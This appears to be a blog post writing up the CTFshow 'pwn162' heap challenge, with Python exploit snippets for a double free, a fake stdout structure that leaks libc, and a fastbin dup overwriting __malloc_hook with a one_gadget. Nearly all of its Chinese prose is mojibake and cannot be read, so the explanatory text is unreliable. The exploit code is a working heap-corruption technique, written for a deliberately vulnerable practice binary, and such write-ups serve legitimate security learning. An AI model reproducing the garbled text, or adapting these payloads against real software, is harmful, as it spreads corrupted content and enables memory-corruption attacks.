---
title: CTFshow pwn162 Double Free + stdout 娉勯湶
published: 2026-04-17
updated: 2026-04-17
description: 鍏堥潬 double free 鎷垮洖浼€?chunk锛屽啀浼€?stdout 缁撴瀯娉勯湶 libc锛屾渶鍚庣浜屾 fastbin dup 鍛戒腑 __malloc_hook銆
tags: [CTFshow, Pwn, Heap, Double Free, stdout, Fastbin]
category: ctfshow
draft: false
---

# 棰樼洰缁撹

`pwn162` 鐨勫叧閿笉鏄崟鐐规紡娲烇紝鑰屾槸涓ゆ缁勫悎锛?
- 鍓嶅崐娈靛埄鐢?double free 鎷垮埌鍙帶鍒嗛厤浣嶇疆锛屽啀浼€?`_IO_2_1_stdout_` 鐩稿叧缁撴瀯娉勯湶 libc
- 鍚庡崐娈靛啀娆?fastbin dup锛屾妸 chunk 鎵撳埌 `__malloc_hook - 0x23`

## 鍒╃敤閾?
1. 甯冨眬澶氫釜 note锛屼娇涓€涓?`0x30` 灏忓潡鑳借鍚庣画 note 缁撴瀯澶嶇敤
2. 鍒堕€?unsorted bin锛屽啀鎶婂叾涓殑浣庝袱瀛楄妭鏀瑰埌 `stdout` 闄勮繎
3. 閫氳繃 fake stdout 鎷垮埌 libc 娉勯湶
4. 鍐嶅仛涓€娆?double free锛屽懡涓?`__malloc_hook - 0x23`
5. 鍐欏叆 `one_gadget` 鍜?`realloc + 0xd`
6. 瑙﹀彂涓嬩竴娆?`malloc`

## 鍏抽敭 exp 鐗囨

```python
delete(1)
delete(2)
delete(1)
add(0x68, b"\xD0")
add(0x68, b"\xD0")
add(0x68, b"\xD0")
add(0x68, b"\xD0")
```

```python
fake_stdout = b"A" * 0x33 + p64(0xFBAD1800) + p64(0) * 3 + p8(0)
io.send(fake_stdout)
leak = u64(io.recv(6).ljust(8, b"\x00"))
```

```python
add(0x68, p64(malloc_hook - 0x23))
hook_payload = b"A" * (0x13 - 8) + p64(one_gadget) + p64(realloc + 0xD)
add(0x68, hook_payload)
cmd(1)
```

## 涓嬭浇

- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn162/pwn)
- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn162/exp.py)
- [涓嬭浇瀵瑰簲 libc `libc-2.23.so`](../../attachments/ctfshow/pwn162/libc-2.23.so)
- [涓嬭浇鍘熷绗旇 `pwn162.md`](../../attachments/ctfshow/pwn162/pwn162.md)

## 閫傚悎璁颁綇鐨勭偣

fake stdout 渚濈劧鏄€佺増鏈?glibc 鍫嗛閲岄潪甯搁珮棰戠殑 libc 娉勯湶鎵嬫硶銆傚彧瑕佽兘鎶婂垎閰嶅懡涓?`_IO_2_1_stdout_` 闄勮繎锛屽氨瑕侀┈涓婃兂鍒板畠銆?

